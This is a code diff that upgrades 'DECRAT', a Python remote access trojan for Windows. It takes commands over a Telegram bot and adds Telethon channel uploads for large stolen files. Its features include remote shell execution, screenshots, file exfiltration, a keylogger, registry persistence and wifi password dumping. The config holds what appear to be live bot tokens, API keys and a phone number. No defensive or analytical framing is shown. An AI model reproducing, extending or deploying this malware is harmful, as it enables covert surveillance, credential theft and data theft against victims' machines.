@@ -1,25 +1,33 @@
-# DECRAT — Telegram C2 Agent
-# pyinstaller --onefile --noconsole agent_tg.py
+# DECRAT v2 — Telegram C2 + Channel uploads (Telethon for large files)
+# pip install requests telethon
+# pyinstaller --onefile --noconsole agent_tg_v2.py
 
-import requests, time, subprocess, os, sys, base64, platform, threading
+import requests, time, subprocess, os, sys, base64, platform, threading, asyncio
 
-# ══════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════
 #   CONFIG — YAHAN PASTE KARO
-# ══════════════════════════════════════════════════════
-BOT_TOKEN = "8901039134:AAEBI8Wn-HKC1b3IG9qzz4hIwKnKv_UyIcA"    # @BotFather se
-CHAT_ID   = "8889476230"      # @userinfobot se
-# ══════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════
+BOT_TOKEN    = "9210089363:AAEIbLdw_XzM7cibtONb3FhqKjnNWE3798s"       # @BotFather se
+CHAT_ID      = "7505093216"         # @userinfobot se
+
+# Large file uploads (Telethon userbot)
+API_ID       = "38629347"          # my.telegram.org
+API_HASH     = "470efaf92b578908891104d8ed7229ac"        # my.telegram.org
+CHANNEL      = "@decrat_sending"    # e.g. "@mychannel"
+PHONE        = "+918529787213"         # e.g. "+919876543210"
+# ══════════════════════════════════════════════════════════════
 
 POLL_INTERVAL = 3
-API = f"https://api.telegram.org/bot{BOT_TOKEN}"
+API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
 last_update_id = 0
 kl_buf     = []
 kl_running = False
 
+# ── Telegram bot helpers ──────────────────────────────────────────────────────
 def tg_send(text):
     try:
         for i in range(0, len(text), 4000):
-            requests.post(f"{API}/sendMessage", json={
+            requests.post(f"{API_URL}/sendMessage", json={
                 "chat_id": CHAT_ID,
                 "text": text[i:i+4000],
                 "parse_mode": "HTML"
@@ -27,18 +35,20 @@ def tg_send(text):
     except: pass
 
 def tg_send_file(filepath, caption=""):
+    """Send via bot (up to 50MB)"""
     try:
         with open(filepath, "rb") as f:
-            requests.post(f"{API}/sendDocument",
+            requests.post(f"{API_URL}/sendDocument",
                 data={"chat_id": CHAT_ID, "caption": caption},
-                files={"document": f}, timeout=30)
+                files={"document": f}, timeout=60)
+        return True
     except Exception as e:
-        tg_send(f"file error: {e}")
+        return False
 
 def tg_get_updates():
     global last_update_id
     try:
-        r = requests.get(f"{API}/getUpdates", params={
+        r = requests.get(f"{API_URL}/getUpdates", params={
             "offset": last_update_id + 1,
             "timeout": 2,
             "allowed_updates": ["message"]
@@ -47,6 +57,49 @@ def tg_get_updates():
     except:
         return []
 
+# ── Telethon channel upload (unlimited size) ──────────────────────────────────
+def channel_upload(filepath, caption=""):
+    """Upload to channel via Telethon userbot — no size limit"""
+    try:
+        from telethon.sync import TelegramClient
+        from telethon import functions
+
+        session_path = os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), "tg_session")
+
+        with TelegramClient(session_path, int(API_ID), API_HASH) as client:
+            client.send_file(
+                CHANNEL,
+                filepath,
+                caption=caption or os.path.basename(filepath),
+                progress_callback=None
+            )
+        return True
+    except Exception as e:
+        tg_send(f"❌ channel upload error: {e}")
+        return False
+
+def smart_send_file(filepath, caption=""):
+    """Auto-pick: bot for <50MB, channel for larger"""
+    try:
+        size = os.path.getsize(filepath)
+        size_mb = size / (1024 * 1024)
+
+        if size_mb < 45:
+            # bot direct send
+            ok = tg_send_file(filepath, caption + f" ({size_mb:.1f}MB)")
+            if not ok:
+                tg_send(f"❌ bot send failed, trying channel...")
+                channel_upload(filepath, caption)
+        else:
+            # large file — channel
+            tg_send(f"📤 File {size_mb:.1f}MB — uploading to channel {CHANNEL}...")
+            ok = channel_upload(filepath, caption + f" ({size_mb:.1f}MB via channel)")
+            if ok:
+                tg_send(f"✅ Uploaded to {CHANNEL}")
+    except Exception as e:
+        tg_send(f"❌ send error: {e}")
+
+# ── Shell ─────────────────────────────────────────────────────────────────────
 def run_shell(cmd):
     try:
         result = subprocess.run(
@@ -62,6 +115,7 @@ def run_shell(cmd):
     except Exception as e:
         return f"[error: {e}]"
 
+# ── Screenshot ────────────────────────────────────────────────────────────────
 def screenshot():
     try:
         import ctypes, struct as st
@@ -93,9 +147,9 @@ def screenshot():
         path="C:\\Windows\\Temp\\ss.bmp"
         with open(path,"wb") as f: f.write(bmp)
         return path
-    except:
-        return None
+    except: return None
 
+# ── Sysinfo ───────────────────────────────────────────────────────────────────
 def get_sysinfo():
     return (f"🖥 <b>SYSTEM INFO</b>\n"
             f"OS: {platform.system()} {platform.version()}\n"
@@ -103,6 +157,7 @@ def get_sysinfo():
             f"User: {os.environ.get('USERNAME', os.environ.get('USER','?'))}\n"
             f"Arch: {platform.machine()}")
 
+# ── Persist ───────────────────────────────────────────────────────────────────
 def persist():
     try:
         import winreg
@@ -115,6 +170,7 @@ def persist():
     except Exception as e:
         return f"❌ failed: {e}"
 
+# ── Keylogger ─────────────────────────────────────────────────────────────────
 def kl_start():
     global kl_running
     if kl_running: return "already running"
@@ -133,24 +189,18 @@ def kl_start():
     threading.Thread(target=_run, daemon=True).start()
     return "✅ keylogger started"
 
+# ── Command handler ───────────────────────────────────────────────────────────
 def handle(text):
     text = text.strip()
 
     if text in ("/start", "/help"):
         return ("📋 <b>Commands</b>\n\n"
-                "/ping — alive check\n"
-                "/sysinfo — system info\n"
-                "/screenshot — screen capture\n"
-                "/shell &lt;cmd&gt; — run command\n"
-                "/download &lt;path&gt; — get file\n"
-                "/keylog_start — start keylogger\n"
-                "/keylog_dump — dump keys\n"
-                "/keylog_stop — stop keylogger\n"
-                "/persist — autostart\n"
-                "/ip — network info\n"
-                "/wifi — saved wifi passwords\n"
-                "/ps — running processes\n"
-                "/users — local users")
+                "/ping\n/sysinfo\n/screenshot\n"
+                "/shell &lt;cmd&gt;\n"
+                "/download &lt;path&gt; — auto bot/channel by size\n"
+                "/channel &lt;path&gt; — force upload to channel\n"
+                "/keylog_start | /keylog_dump | /keylog_stop\n"
+                "/persist\n/ip\n/wifi\n/ps\n/users")
 
     elif text == "/ping":
         return f"🟢 alive — {platform.node()}"
@@ -160,7 +210,9 @@ def handle(text):
 
     elif text == "/screenshot":
         path = screenshot()
-        if path: tg_send_file(path, "📸 screenshot"); return None
+        if path:
+            smart_send_file(path, "📸 screenshot")
+            return None
         return "❌ screenshot failed"
 
     elif text.startswith("/shell "):
@@ -168,9 +220,21 @@ def handle(text):
         return f"<code>{text[7:]}</code>\n\n{out}"
 
     elif text.startswith("/download "):
-        path = text[10:]
-        tg_send_file(path, f"📁 {os.path.basename(path)}")
+        path = text[10:].strip()
+        if not os.path.exists(path):
+            return f"❌ file not found: {path}"
+        smart_send_file(path, f"📁 {os.path.basename(path)}")
         return None
+
+    elif text.startswith("/channel "):
+        # force channel upload regardless of size
+        path = text[9:].strip()
+        if not os.path.exists(path):
+            return f"❌ file not found: {path}"
+        size_mb = os.path.getsize(path)/(1024*1024)
+        tg_send(f"📤 Uploading {os.path.basename(path)} ({size_mb:.1f}MB) to {CHANNEL}...")
+        ok = channel_upload(path, f"📁 {os.path.basename(path)}")
+        return f"✅ Done — check {CHANNEL}" if ok else f"❌ failed"
 
     elif text == "/keylog_start":
         return kl_start()
@@ -209,6 +273,7 @@ def handle(text):
 
     return None
 
+# ── Main loop ─────────────────────────────────────────────────────────────────
 def main():
     if sys.platform == "win32":
         try:
@@ -217,7 +282,7 @@ def main():
 
     global last_update_id
     time.sleep(2)
-    tg_send(f"🟢 Agent connected\n{get_sysinfo()}")
+    tg_send(f"🟢 Agent v2 connected\n{get_sysinfo()}\n\n📡 Channel: {CHANNEL}")
 
     while True:
         try:
